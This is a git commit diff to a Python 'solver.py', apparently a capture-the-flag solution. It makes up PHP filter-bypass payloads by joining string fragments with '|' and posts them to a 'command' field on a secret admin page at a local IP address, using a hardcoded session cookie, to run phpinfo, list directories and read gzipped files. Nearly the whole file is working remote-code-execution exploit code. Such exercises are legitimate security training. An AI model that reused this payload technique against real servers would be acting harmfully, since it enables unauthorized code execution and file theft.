50f3b8975d875833a0068404e73fa41762e20991
Ardian Danny <65061019+shatternox@users.noreply.github.com>
2022-09-29 17:05:55 +0700

    Update solver.py

--- solver.py
+++ solver.py
@@ -1,4 +1,11 @@
 import string
+import requests
+
+
+URL = "http://192.168.0.109:55555/sup3r_secret_admin_page_by_goerli_gogo.php";
+cookie = {
+  'PHPSESSID':'b6f0268f18ebd7582b8086c91dabd6d7'
+}
 
 def make_payload(pay):
   # pay = "</pre>"
@@ -21,29 +28,70 @@ def make_payload(pay):
   return f'"{"".join(one)}"|"{"".join(two)}"'
 
 
+
 final_payload = f"""
   ({make_payload('phpinfo')})();
 """
 
 print(final_payload)
 
+data = {
+  "command":final_payload
+}
+
+response = requests.post(URL, data=data, cookies=cookie)
+print(response.text);
+print(final_payload);
+
+
 # (var_dump)((scandir)('/'));
 final_payload = f"""
 ({make_payload("var_dump")})(({make_payload('scandir')})({make_payload('/')}));
 """
+data = {
+  "command":final_payload
+}
 
+response = requests.post(URL, data=data, cookies=cookie)
+print(response.text);
 print(final_payload);
+
 
 final_payload = f"""
 ({make_payload("var_dump")})(({make_payload('scandir')})({make_payload('/nft-collection')}));
 """
 
+data = {
+  "command":final_payload
+}
+
+response = requests.post(URL, data=data, cookies=cookie)
+print(response.text);
 print(final_payload);
+
 
 final_payload = f"""
 ({make_payload("readgzfile")})({make_payload("/nft-collection/nft002")});
 """
 
+data = {
+  "command":final_payload
+}
+
+response = requests.post(URL, data=data, cookies=cookie)
+print(response.text);
 print(final_payload);
 
+
+final_payload = f"""
+({make_payload("readgzfile")})({make_payload("/nft-collection/you_might_need_this")});
+"""
+
+data = {
+  "command":final_payload
+}
+
+response = requests.post(URL, data=data, cookies=cookie)
+print(response.text);
+print(final_payload);
 
